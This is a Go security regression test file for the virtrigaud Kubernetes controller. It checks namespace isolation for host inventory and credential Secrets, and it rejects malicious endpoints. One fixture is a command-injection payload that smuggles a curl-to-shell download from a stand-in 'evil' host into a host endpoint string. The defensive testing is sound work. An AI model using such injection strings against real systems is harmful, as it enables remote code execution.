/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"context"
	"encoding/base64"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/tools/record"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"
	"sigs.k8s.io/controller-runtime/pkg/client/interceptor"

	infravirtrigaudiov1beta1 "github.com/projectbeskar/virtrigaud/api/infra.virtrigaud.io/v1beta1"
)

// Security regression tests for the clustered host-inventory render
// (same-namespace model): a Host in another namespace must not enrol into a
// Provider's inventory, and the render must never read a credential Secret
// outside the Provider's namespace.

// foreignSSHKey is credential material that lives ONLY in a namespace other
// than the Provider's. If any byte of it reaches the rendered inventory, a log,
// or an event, the cross-namespace exfiltration path is open.
var foreignSSHKey = []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nFOREIGN-NAMESPACE-KEY-MUST-NOT-BE-COPIED-0009\n-----END OPENSSH PRIVATE KEY-----\n")

// secretIn builds a credential Secret in an explicit namespace.
func secretIn(ns, name string, data map[string][]byte) *corev1.Secret {
	s := credSecret(name, data)
	s.Namespace = ns
	return s
}

// secretGetRecorder is a fake-client Get interceptor that records the
// namespace of every Secret the code under test tries to read.
type secretGetRecorder struct {
	mu         sync.Mutex
	namespaces []string
}

func (s *secretGetRecorder) funcs() interceptor.Funcs {
	return interceptor.Funcs{
		Get: func(ctx context.Context, c client.WithWatch, key client.ObjectKey, obj client.Object, opts ...client.GetOption) error {
			if _, ok := obj.(*corev1.Secret); ok {
				s.mu.Lock()
				s.namespaces = append(s.namespaces, key.Namespace)
				s.mu.Unlock()
			}
			return c.Get(ctx, key, obj, opts...)
		},
	}
}

func (s *secretGetRecorder) readNamespaces() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.namespaces...)
}

// assertNoForeignMaterial fails if the foreign-namespace key (raw or base64)
// appears in s.
func assertNoForeignMaterial(t *testing.T, s string) {
	t.Helper()
	assert.NotContains(t, s, string(foreignSSHKey))
	assert.NotContains(t, s, base64.StdEncoding.EncodeToString(foreignSSHKey))
	assert.False(t, strings.Contains(s, "FOREIGN-NAMESPACE-KEY"), "foreign-namespace credential token leaked")
}

// TestHostBelongsToProvider is the membership table for the same-namespace
// model: namespace AND name must both match.
func TestHostBelongsToProvider(t *testing.T) {
	prov := clusterProvider("libvirt-cluster") // namespace "default"
	cases := []struct {
		name     string
		mutate   func(h *infravirtrigaudiov1beta1.Host)
		provider string
		want     bool
	}{
		{name: "same namespace, same name", provider: "libvirt-cluster", want: true},
		{name: "same namespace, other provider", provider: "other", want: false},
		{name: "other namespace, same provider name", provider: "libvirt-cluster", want: false,
			mutate: func(h *infravirtrigaudiov1beta1.Host) { h.Namespace = "tenant" }},
		{name: "other namespace, other provider", provider: "other", want: false,
			mutate: func(h *infravirtrigaudiov1beta1.Host) { h.Namespace = "tenant" }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h := hostCR("host-a", tc.provider, nil)
			if tc.mutate != nil {
				tc.mutate(h)
			}
			assert.Equal(t, tc.want, hostBelongsToProvider(h, prov))
		})
	}
}

// TestHostCredentialSecretKey is the credential-resolution table: every key
// resolves in the Provider's namespace, and a Provider credentialSecretRef
// naming another namespace is rejected (never resolved to a readable key).
func TestHostCredentialSecretKey(t *testing.T) {
	cases := []struct {
		name         string
		hostRef      *infravirtrigaudiov1beta1.LocalObjectReference
		providerRef  infravirtrigaudiov1beta1.ObjectRef
		wantKey      types.NamespacedName
		wantRejected bool
	}{
		{
			name:        "provider default, no namespace",
			providerRef: infravirtrigaudiov1beta1.ObjectRef{Name: "test-creds"},
			wantKey:     types.NamespacedName{Namespace: "default", Name: "test-creds"},
		},
		{
			name:        "provider default, explicit same namespace",
			providerRef: infravirtrigaudiov1beta1.ObjectRef{Name: "test-creds", Namespace: "default"},
			wantKey:     types.NamespacedName{Namespace: "default", Name: "test-creds"},
		},
		{
			name:         "provider default, foreign namespace is rejected",
			providerRef:  infravirtrigaudiov1beta1.ObjectRef{Name: "test-creds", Namespace: "kube-system"},
			wantRejected: true,
		},
		{
			name:        "host override resolves in provider namespace",
			hostRef:     &infravirtrigaudiov1beta1.LocalObjectReference{Name: "host-creds"},
			providerRef: infravirtrigaudiov1beta1.ObjectRef{Name: "test-creds", Namespace: "kube-system"},
			wantKey:     types.NamespacedName{Namespace: "default", Name: "host-creds"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			prov := clusterProvider("libvirt-cluster")
			prov.Spec.CredentialSecretRef = tc.providerRef
			h := hostCR("host-a", "libvirt-cluster", nil)
			h.Spec.CredentialSecretRef = tc.hostRef

			key, rejected := hostCredentialSecretKey(h, prov)
			if tc.wantRejected {
				assert.NotEmpty(t, rejected, "a foreign-namespace credential ref must be rejected")
				assert.Equal(t, types.NamespacedName{}, key, "a rejected ref must not yield a readable key")
				return
			}
			assert.Empty(t, rejected)
			assert.Equal(t, tc.wantKey, key)
		})
	}
}

// TestProvider_HostInventory_IgnoresHostsInOtherNamespaces proves a Host that
// lives in another namespace — even one naming this Provider and carrying a
// credentialSecretRef to a Secret in ITS namespace — is never rendered and its
// Secret is never read (the C1 enrolment + S1 exfiltration path).
func TestProvider_HostInventory_IgnoresHostsInOtherNamespaces(t *testing.T) {
	sch := newProviderTLSScheme(t)
	prov := clusterProvider("libvirt-cluster")

	legit := hostCR("host-a", "libvirt-cluster", nil)
	attacker := hostCR("evil", "libvirt-cluster", nil)
	attacker.Namespace = "tenant"
	attacker.Spec.Endpoint = "qemu+ssh://virt@victim/system"
	attacker.Spec.CredentialSecretRef = &infravirtrigaudiov1beta1.LocalObjectReference{Name: "tenant-creds"}

	rec := &secretGetRecorder{}
	cli := fake.NewClientBuilder().
		WithScheme(sch).
		WithObjects(prov, legit, attacker,
			credSecret("test-creds", sshCredData()),
			secretIn("tenant", "tenant-creds", map[string][]byte{"ssh-privatekey": foreignSSHKey})).
		WithInterceptorFuncs(rec.funcs()).
		WithStatusSubresource(&infravirtrigaudiov1beta1.Provider{}).
		Build()
	r := &ProviderReconciler{Client: cli, Scheme: sch}

	require.NoError(t, r.reconcileHostInventorySecret(context.Background(), prov))

	assert.Equal(t, []string{"host-a"}, renderedHostIDs(t, cli), "a Host from another namespace must not be rendered")
	for _, ns := range rec.readNamespaces() {
		assert.Equal(t, "default", ns, "credential Secrets may only be read in the Provider's namespace")
	}
	secret := &corev1.Secret{}
	require.NoError(t, cli.Get(context.Background(),
		types.NamespacedName{Name: "libvirt-cluster-hosts", Namespace: "default"}, secret))
	assertNoForeignMaterial(t, string(secret.Data["hosts.json"]))
}

// TestProvider_HostInventory_HostCredentialRefNeverLeavesProviderNamespace
// proves a same-namespace Host's credentialSecretRef resolves ONLY in the
// Provider's namespace: a Secret with that name that exists solely in another
// namespace is reported not-found (host skipped), never copied.
func TestProvider_HostInventory_HostCredentialRefNeverLeavesProviderNamespace(t *testing.T) {
	sch := newProviderTLSScheme(t)
	prov := clusterProvider("libvirt-cluster")

	hostA := hostCR("host-a", "libvirt-cluster", nil) // falls back to test-creds
	hostB := hostCR("host-b", "libvirt-cluster", nil)
	hostB.Spec.CredentialSecretRef = &infravirtrigaudiov1beta1.LocalObjectReference{Name: "vault-ssh"}

	rec := &secretGetRecorder{}
	cli := fake.NewClientBuilder().
		WithScheme(sch).
		WithObjects(prov, hostA, hostB,
			credSecret("test-creds", sshCredData()),
			// "vault-ssh" exists ONLY in another namespace.
			secretIn("kube-system", "vault-ssh", map[string][]byte{"ssh-privatekey": foreignSSHKey})).
		WithInterceptorFuncs(rec.funcs()).
		WithStatusSubresource(&infravirtrigaudiov1beta1.Provider{}).
		Build()
	eventRec := record.NewFakeRecorder(10)
	r := &ProviderReconciler{Client: cli, Scheme: sch, Recorder: eventRec}

	require.NoError(t, r.reconcileHostInventorySecret(context.Background(), prov))

	assert.Equal(t, []string{"host-a"}, renderedHostIDs(t, cli))
	for _, ns := range rec.readNamespaces() {
		assert.Equal(t, "default", ns, "credential Secrets may only be read in the Provider's namespace")
	}
	cond := getConditionByType(t, prov.Status.Conditions, conditionHostCredentialsReady)
	require.NotNil(t, cond)
	assert.Equal(t, metav1.ConditionFalse, cond.Status)
	assert.Equal(t, reasonCredentialsUnresolved, cond.Reason)
	assert.Contains(t, cond.Message, "default/vault-ssh not found")

	secret := &corev1.Secret{}
	require.NoError(t, cli.Get(context.Background(),
		types.NamespacedName{Name: "libvirt-cluster-hosts", Namespace: "default"}, secret))
	assertNoForeignMaterial(t, string(secret.Data["hosts.json"]))
	for _, e := range drainEvents(eventRec) {
		assertNoForeignMaterial(t, e)
	}
}

// TestProvider_HostInventory_ProviderCredentialRefForeignNamespace_Skipped
// proves the released-API half of S1: a clustered Provider whose own
// spec.credentialSecretRef names ANOTHER namespace does not get that Secret
// read. Hosts that would fall back to it are skipped with the dedicated
// CredentialRefNamespaceRejected reason; a host with its own same-namespace
// credentialSecretRef still renders.
func TestProvider_HostInventory_ProviderCredentialRefForeignNamespace_Skipped(t *testing.T) {
	sch := newProviderTLSScheme(t)
	prov := clusterProvider("libvirt-cluster")
	prov.Spec.CredentialSecretRef = infravirtrigaudiov1beta1.ObjectRef{Name: "test-creds", Namespace: "kube-system"}

	ownKey := []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nHOST-B-OWN-KEY-0010\n-----END OPENSSH PRIVATE KEY-----\n")
	hostA := hostCR("host-a", "libvirt-cluster", nil) // would fall back to the foreign ref
	hostB := hostCR("host-b", "libvirt-cluster", nil)
	hostB.Spec.CredentialSecretRef = &infravirtrigaudiov1beta1.LocalObjectReference{Name: "host-b-creds"}

	rec := &secretGetRecorder{}
	cli := fake.NewClientBuilder().
		WithScheme(sch).
		WithObjects(prov, hostA, hostB,
			secretIn("kube-system", "test-creds", map[string][]byte{"ssh-privatekey": foreignSSHKey}),
			credSecret("host-b-creds", map[string][]byte{"ssh-privatekey": ownKey})).
		WithInterceptorFuncs(rec.funcs()).
		WithStatusSubresource(&infravirtrigaudiov1beta1.Provider{}).
		Build()
	eventRec := record.NewFakeRecorder(10)
	r := &ProviderReconciler{Client: cli, Scheme: sch, Recorder: eventRec}

	require.NoError(t, r.reconcileHostInventorySecret(context.Background(), prov))

	inv := renderedInventory(t, cli)
	require.Len(t, inv.Hosts, 1)
	assert.Equal(t, "host-b", inv.Hosts[0].ID)
	assert.Equal(t, ownKey, inv.Hosts[0].Credentials.SSHPrivateKey)

	for _, ns := range rec.readNamespaces() {
		assert.NotEqual(t, "kube-system", ns, "the foreign-namespace credential Secret must never be read")
	}

	cond := getConditionByType(t, prov.Status.Conditions, conditionHostCredentialsReady)
	require.NotNil(t, cond)
	assert.Equal(t, metav1.ConditionFalse, cond.Status)
	assert.Equal(t, reasonCredentialRefNamespaceRejected, cond.Reason)
	assert.Contains(t, cond.Message, "host-a")
	assert.Contains(t, cond.Message, "kube-system")
	assert.NotContains(t, cond.Message, "host-b (", "a rendered host must not be listed as skipped")
	assertNoForeignMaterial(t, cond.Message)

	events := drainEvents(eventRec)
	require.Len(t, events, 1)
	assert.Contains(t, events[0], eventReasonCredentialsUnresolved)
	assertNoForeignMaterial(t, events[0])
}

// TestProvider_HostInventory_InvalidEndpointSkipped proves the controller-side
// defense in depth behind the CRD pattern: a Host whose endpoint would smuggle
// shell metacharacters (the fake client does not run CRD validation, modelling
// a bypass) is not rendered, siblings are, and neither the event nor the
// condition echoes the endpoint.
func TestProvider_HostInventory_InvalidEndpointSkipped(t *testing.T) {
	sch := newProviderTLSScheme(t)
	prov := clusterProvider("libvirt-cluster")

	const payload = "qemu+ssh://virt@victim/system;curl${IFS}evil|sh"
	good := hostCR("host-a", "libvirt-cluster", nil)
	bad := hostCR("host-b", "libvirt-cluster", nil)
	bad.Spec.Endpoint = payload

	cli := fake.NewClientBuilder().
		WithScheme(sch).
		WithObjects(prov, good, bad, credSecret("test-creds", sshCredData())).
		WithStatusSubresource(&infravirtrigaudiov1beta1.Provider{}).
		Build()
	eventRec := record.NewFakeRecorder(10)
	r := &ProviderReconciler{Client: cli, Scheme: sch, Recorder: eventRec}

	require.NoError(t, r.reconcileHostInventorySecret(context.Background(), prov))

	assert.Equal(t, []string{"host-a"}, renderedHostIDs(t, cli))
	cond := getConditionByType(t, prov.Status.Conditions, conditionHostCredentialsReady)
	require.NotNil(t, cond)
	assert.Equal(t, metav1.ConditionTrue, cond.Status,
		"an invalid endpoint is not a credential problem; the credential condition stays True")

	events := drainEvents(eventRec)
	require.Len(t, events, 1)
	assert.Contains(t, events[0], eventReasonHostInventoryEntrySkipped)
	assert.Contains(t, events[0], "host-b")
	assert.NotContains(t, events[0], payload, "the event must never echo the raw endpoint")
	assert.NotContains(t, events[0], "evil")
}

// TestProvider_HostInventory_DuplicateHostIDs_Deterministic proves duplicated
// host ids (injected through the List — unreachable via a real apiserver, which
// keeps names unique per namespace) are handled deterministically: EVERY entry
// with the id is skipped, the render still succeeds for the others, and the
// output is identical regardless of the order the duplicates arrive in.
func TestProvider_HostInventory_DuplicateHostIDs_Deterministic(t *testing.T) {
	render := func(t *testing.T, impostorFirst bool) ([]string, []string) {
		t.Helper()
		sch := newProviderTLSScheme(t)
		prov := clusterProvider("libvirt-cluster")
		hostA := hostCR("host-a", "libvirt-cluster", nil)
		hostB := hostCR("host-b", "libvirt-cluster", nil)

		cli := fake.NewClientBuilder().
			WithScheme(sch).
			WithObjects(prov, hostA, hostB, credSecret("test-creds", sshCredData())).
			WithInterceptorFuncs(interceptor.Funcs{
				List: func(ctx context.Context, c client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
					if err := c.List(ctx, list, opts...); err != nil {
						return err
					}
					hl, ok := list.(*infravirtrigaudiov1beta1.HostList)
					if !ok {
						return nil
					}
					impostor := hostCR("host-a", "libvirt-cluster", nil)
					impostor.Spec.Endpoint = "qemu+ssh://virt@impostor/system"
					if impostorFirst {
						hl.Items = append([]infravirtrigaudiov1beta1.Host{*impostor}, hl.Items...)
					} else {
						hl.Items = append(hl.Items, *impostor)
					}
					return nil
				},
			}).
			WithStatusSubresource(&infravirtrigaudiov1beta1.Provider{}).
			Build()
		eventRec := record.NewFakeRecorder(10)
		r := &ProviderReconciler{Client: cli, Scheme: sch, Recorder: eventRec}

		require.NoError(t, r.reconcileHostInventorySecret(context.Background(), prov),
			"a duplicated id must not fail the whole render")
		return renderedHostIDs(t, cli), drainEvents(eventRec)
	}

	idsA, eventsA := render(t, false)
	idsB, eventsB := render(t, true)

	assert.Equal(t, []string{"host-b"}, idsA, "every entry of a duplicated id must be skipped")
	assert.Equal(t, idsA, idsB, "the render must not depend on the order duplicates arrive in")
	require.Len(t, eventsA, 1)
	assert.Contains(t, eventsA[0], eventReasonHostInventoryEntrySkipped)
	assert.Equal(t, 1, strings.Count(eventsA[0], "host-a ("), "a duplicated id is reported once, not per occurrence")
	assert.Contains(t, eventsA[0], "2 entries")
	assert.Equal(t, eventsA, eventsB, "skip reporting must be deterministic too")
}
